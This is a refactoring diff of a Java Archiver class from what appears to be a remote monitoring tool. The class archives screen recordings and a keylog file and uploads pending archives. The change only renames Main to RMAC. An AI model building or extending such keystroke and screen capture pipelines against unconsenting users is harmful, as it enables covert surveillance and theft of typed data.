@@ -1,6 +1,6 @@
 package com.rmac.core;
 
-import com.rmac.Main;
+import com.rmac.RMAC;
 import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Constants;
 import com.rmac.utils.Utils;
@@ -79,17 +79,17 @@ public class Archiver {
     String archiveLocation = this.getArchiveLocation(type);
     try {
       Path file = Paths.get(filePath);
-      Main.fs.move(filePath, archiveLocation + "\\" + file.getFileName());
+      RMAC.fs.move(filePath, archiveLocation + "\\" + file.getFileName());
     } catch (IOException e) {
       log.error("Could not move file to staging", e);
     }
     long stagingSize = this.getDirectorySize(archiveLocation);
-    if (stagingSize < Main.config.getMaxStagingSize()) {
+    if (stagingSize < RMAC.config.getMaxStagingSize()) {
       return;
     }
     log.warn("Staging full");
     long pendingSize = this.getDirectorySize(Constants.PENDING_ARCHIVES_LOCATION);
-    if (pendingSize >= Main.config.getMaxStorageSize()) {
+    if (pendingSize >= RMAC.config.getMaxStorageSize()) {
       log.warn("Storage size limit reached, deleting old files");
       this.deleteOldestFile(Constants.PENDING_ARCHIVES_LOCATION);
     }
@@ -136,7 +136,7 @@ public class Archiver {
     File[] pendingFiles = new File(Constants.PENDING_ARCHIVES_LOCATION).listFiles();
     if (pendingFiles != null && pendingFiles.length > 0) {
       for (File pendingFile : pendingFiles) {
-        Main.uploader.uploadFile(pendingFile, ArchiveFileType.ARCHIVE);
+        RMAC.uploader.uploadFile(pendingFile, ArchiveFileType.ARCHIVE);
       }
     }
   }
@@ -158,10 +158,10 @@ public class Archiver {
    */
   public void cleanUp() {
     try {
-      Main.fs
+      RMAC.fs
           .list(Constants.CURRENT_LOCATION)
           .filter(path -> path.getFileName().endsWith(".mkv"))
-          .forEach(path -> Main.archiver.moveToArchive(
+          .forEach(path -> RMAC.archiver.moveToArchive(
               path.toAbsolutePath().toString(), ArchiveFileType.SCREEN
           ));
     } catch (IOException e) {
@@ -170,8 +170,8 @@ public class Archiver {
 
     String keyFilePath = Constants.TEMP_LOCATION + "\\Key-" + Utils.getTimestamp() + ".txt";
     try {
-      Main.fs.move(Constants.KEYLOG_LOCATION, keyFilePath, StandardCopyOption.REPLACE_EXISTING);
-      Main.archiver.moveToArchive(keyFilePath, ArchiveFileType.KEY);
+      RMAC.fs.move(Constants.KEYLOG_LOCATION, keyFilePath, StandardCopyOption.REPLACE_EXISTING);
+      RMAC.archiver.moveToArchive(keyFilePath, ArchiveFileType.KEY);
     } catch (IOException e) {
       log.error("Could not move key file to temp", e);
     }
